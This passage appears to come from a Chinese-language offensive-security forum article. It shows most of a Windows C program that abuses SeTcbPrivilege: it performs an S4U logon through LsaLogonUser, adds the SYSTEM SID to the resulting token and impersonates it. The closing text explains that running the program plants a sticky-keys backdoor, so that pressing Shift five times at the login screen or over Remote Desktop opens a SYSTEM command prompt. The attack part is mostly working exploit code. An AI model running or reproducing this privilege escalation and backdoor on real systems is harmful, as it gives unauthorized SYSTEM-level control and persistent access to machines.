            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        wprintf(L" > Token Statistics Information: \n");
        wprintf(L"   Token Id            : %u:%u (%08x:%08x)\n", pTokenStatistics->TokenId.HighPart, pTokenStatistics->TokenId.LowPart, pTokenStatistics->TokenId.HighPart, pTokenStatistics->TokenId.LowPart);
        wprintf(L"   Authentication Id   : %u:%u (%08x:%08x)\n", pTokenStatistics->AuthenticationId.HighPart, pTokenStatistics->AuthenticationId.LowPart, pTokenStatistics->AuthenticationId.HighPart, pTokenStatistics->AuthenticationId.LowPart);
        wprintf(L"   Token Type          : %d\n", pTokenStatistics->TokenType);
        wprintf(L"   Impersonation Level : %d\n", pTokenStatistics->ImpersonationLevel);
        wprintf(L"   Group Count         : %d\n", pTokenStatistics->GroupCount);
        wprintf(L"   Privilege Count     : %d\n\n", pTokenStatistics->PrivilegeCount);

        status = TRUE;
    }

    if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, 0, &dwLength))
    {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        pTokenGroups = (PTOKEN_GROUPS)LocalAlloc(LPTR, dwLength);
        if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, dwLength, &dwLength))
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        wprintf(L" > Token Group Information: \n");
        for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
        {
            pSid = pTokenGroups->Groups[i].Sid;
            if (!ConvertSidToStringSidW(pSid, &lpGroupSid)) {
                wprintf(L"[-] ConvertSidToStringSidW Error: [%u].\n", GetLastError());
                goto Clear;
            }

            wprintf(L"   %ws\n", lpGroupSid);
        }

        status = TRUE;
    }

    if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIntegrityLevel, 0, &dwLength))
    {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        pTokenIntegrityLevel = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LPTR, dwLength);
        if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIntegrityLevel, dwLength, &dwLength))
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        wprintf(L"\n > Token Integrity Level: \n");
        pSid = pTokenIntegrityLevel->Label.Sid;
        if (!ConvertSidToStringSidW(pSid, &lpIntegritySid)) {
            wprintf(L"[-] ConvertSidToStringSidW Error: [%u].\n", GetLastError());
            goto Clear;
        }
        wprintf(L"   %ws\n", lpIntegritySid);

        status = TRUE;
        goto Clear;
    }
Clear:
    if (pTokenStatistics != NULL)
        LocalFree(pTokenStatistics);
    if (pTokenGroups != NULL)
        LocalFree(pTokenGroups);

    return status;

}

PBYTE
InitUnicodeString(
    _Out_ PUNICODE_STRING DestinationString,
    _In_z_ LPCWSTR szSourceString,
    _In_ PBYTE pbDestinationBuffer
)
{
    USHORT StringSize;

    StringSize = (USHORT)wcslen(szSourceString) * sizeof(WCHAR);
    memcpy(pbDestinationBuffer, szSourceString, StringSize);

    DestinationString->Length = StringSize;
    DestinationString->MaximumLength = StringSize + sizeof(WCHAR);
    DestinationString->Buffer = (PWSTR)pbDestinationBuffer;

    return (PBYTE)pbDestinationBuffer + StringSize + sizeof(WCHAR);
}

NTSTATUS DoS4U(HANDLE hToken)
{
    NTSTATUS status = 0;
    NTSTATUS subStatus = 0;
    HANDLE hThread = NULL;
    HANDLE phNewToken = NULL;
    PTOKEN_GROUPS pGroups = NULL;
    PSID pLogonSid = NULL;
    PSID pExtraSid = NULL;
    DWORD dwMsgS4ULength;

    PBYTE pbPosition;

    DWORD dwProfile = 0;
    LUID logonId = { 0 };
    ULONG profileBufferLength;
    PVOID profileBuffer;
    QUOTA_LIMITS quotaLimits;
    HANDLE hTokenS4U = NULL;
    PVOID pvProfile = NULL;

    LSA_STRING OriginName = { 15, 16, (PCHAR)"S4U for Windows" };
    PMSV1_0_S4U_LOGON pS4uLogon = NULL;
    TOKEN_SOURCE TokenSource;

    TOKEN_MANDATORY_LABEL TIL = { 0 };

    LPCWSTR szDomain = L".";
    LPCWSTR szUsername = L"John";//the user who has SeTcbPrivilege

    WCHAR systemSID[] = L"S-1-5-18";
    ConvertStringSidToSidW(systemSID, &pExtraSid);

    WCHAR mediumInt[] = L"S-1-16-8192";
    PSID mediumSID = NULL;
    ConvertStringSidToSidW(mediumInt, &mediumSID);

    HANDLE hThreadToken = NULL;
    PTOKEN_MANDATORY_LABEL pTokenIntegrityLevel = NULL;
    DWORD dwLength;
    LPWSTR lpGroupSid;

    if (!GetLogonSID(hToken, &pLogonSid))
    {
        wprintf(L"[-] Unable to find logon SID.\n");
        goto Clear;
    }

    if (!NT_SUCCESS(LsaInit()))
    {
        wprintf(L"[-] Failed to start kerberos initialization.\n");
        goto Clear;
    }

    wprintf(L"[*] Initialize S4U login.\n");
    // Create MSV1_0_S4U_LOGON structure
    dwMsgS4ULength = sizeof(MSV1_0_S4U_LOGON) + (EXTRA_SID_COUNT + (DWORD)wcslen(szDomain) + (DWORD)wcslen(szUsername)) * sizeof(WCHAR);
    pS4uLogon = (PMSV1_0_S4U_LOGON)LocalAlloc(LPTR, dwMsgS4ULength);
    if (pS4uLogon == NULL)
    {
        wprintf(L"[-] LocalAlloc Error: [%u].", GetLastError());
        goto Clear;
    }

    pS4uLogon->MessageType = MsV1_0S4ULogon;
    pbPosition = (PBYTE)pS4uLogon + sizeof(MSV1_0_S4U_LOGON);
    pbPosition = InitUnicodeString(&pS4uLogon->UserPrincipalName, szUsername, pbPosition);
    pbPosition = InitUnicodeString(&pS4uLogon->DomainName, szDomain, pbPosition);

    strcpy_s(TokenSource.SourceName, TOKEN_SOURCE_LENGTH, "User32");
    AllocateLocallyUniqueId(&TokenSource.SourceIdentifier);

    // Add extra SID to token.
    // If the application needs to connect to a Windows Desktop, Logon SID must be added to the Token.
    wprintf(L"[*] Add extra SID S-1-5-18 to token.\n");
    pGroups = (PTOKEN_GROUPS)LocalAlloc(LPTR, sizeof(TOKEN_GROUPS) + 2 * sizeof(SID_AND_ATTRIBUTES));
    if (pGroups == NULL)
    {
        wprintf(L"[-] LocalAlloc Error: [%u].", GetLastError());
        goto Clear;
    }

    // Add Logon Sid, if present.
    if (pLogonSid)
    {
        pGroups->Groups[pGroups->GroupCount].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
        pGroups->Groups[pGroups->GroupCount].Sid = pLogonSid;
        pGroups->GroupCount++;
    }

    // If an extra SID is specified to command line, add it to the pGroups structure.
    pGroups->Groups[pGroups->GroupCount].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
    pGroups->Groups[pGroups->GroupCount].Sid = pExtraSid;
    pGroups->GroupCount++;

    // Call LSA LsaLogonUser
    // This call required SeTcbPrivilege privilege:
    //    - [1] to get a primary token (vs impersonation token). The privilege MUST be activated.
    //    - [2] to add supplemental SID with LocalGroups parameter.
    //    - [3] to use a username with a domain name different from machine name (or '.').

    status = LsaLogonUser(
        hLSA,
        &OriginName,
        Network,                // Or Batch
        ulAuthenticationPackage,
        pS4uLogon,
        dwMsgS4ULength,
        pGroups,                // LocalGroups
        &TokenSource,           // SourceContext
        &pvProfile,
        &dwProfile,
        &logonId,
        &hTokenS4U,
        &quotaLimits,
        &subStatus
    );
    if (status != STATUS_SUCCESS)
    {
        wprintf(L"[-] LsaLogonUser Error: [0x%x].", status);
        goto Clear;
    }

    wprintf(L"[*] Set the token integrity level to medium.\n");

    TIL.Label.Attributes = SE_GROUP_INTEGRITY;
    TIL.Label.Sid = mediumSID;

    if (!SetTokenInformation(hTokenS4U, TokenIntegrityLevel, &TIL, sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(mediumSID)))
    {
        wprintf(L"[-] SetTokenInformation Error: [%u].\n", GetLastError());
    }

    hThread = GetCurrentThread();

    if (!SetThreadToken(&hThread, hTokenS4U))
    {
        wprintf(L"[-] SetThreadToken Error: [%u].\n", GetLastError());
    }

    wprintf(L"[*] LsaLogonUser successfully and get S4U token: \n\n");

    if (!DisplayTokenInformation(hTokenS4U))
    {
        wprintf(L"[-] Failed to get S4U token information.\n");
    }

    wprintf(L"\n[*] Successfully impersonated S4U.\n");
    ExploitSeTcbPrivilege();

    goto Clear;

Clear:
    if (OriginName.Buffer)
        LocalFree(OriginName.Buffer);
    if (pLogonSid)
        LocalFree(pLogonSid);
    if (pExtraSid)
        LocalFree(pExtraSid);
    if (pS4uLogon)
        LocalFree(pS4uLogon);
    if (pGroups)
        LocalFree(pGroups);
    if (hLSA)
        LsaClose(hLSA);
    if (hToken)
        CloseHandle(hToken);
    if (hTokenS4U)
        CloseHandle(hTokenS4U);

    return status;
}

BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
    BOOL status = FALSE;
    LUID luidValue = { 0 };
    TOKEN_PRIVILEGES tokenPrivileges;

    // Get the LUID value of the privilege for the local system
    if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
    {
        wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
        return status;
    }

    // Set escalation information
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = luidValue;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Elevate Process Token Access
    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
    {
        wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
        return status;
    }
    else
    {
        status = TRUE;
    }
    return status;
}

int wmain(int argc, wchar_t* argv[])
{
    HANDLE hToken = NULL;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
    {
        wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
        return 0;
    }

    // Enable SeRestorePrivilege for the current process token.
    if (EnableTokenPrivilege(hToken, SE_TCB_NAME))
    {
        if (NT_SUCCESS(DoS4U(hToken)))
        {
            return 1;
        }
    }
}
```

### Let’s see it in action

直接在 John 用户的上下文中执行 SeTcbPrivilege.exe 即可设置一个粘滞键后门：

```powershell
SeTcbPrivilege.exe
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/07/attach-c038282b9df68fba2927fa9ba94210633b313469.png)

可以看到，生成的模拟令牌中已经加入了 NT AUTHORITY\\SYSTEM 账户的 SID（S-1-5-18），并且粘滞键后门设置成功。在远程桌面或用户登录屏幕中连按 5 次 Shift 键即可获取一个命令行窗口，并且为 NT AUTHORITY\\SYSTEM 权限，如下图所示。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/07/attach-afab6c11945e08742d80ff8d9f7ce78743d3b88e.png)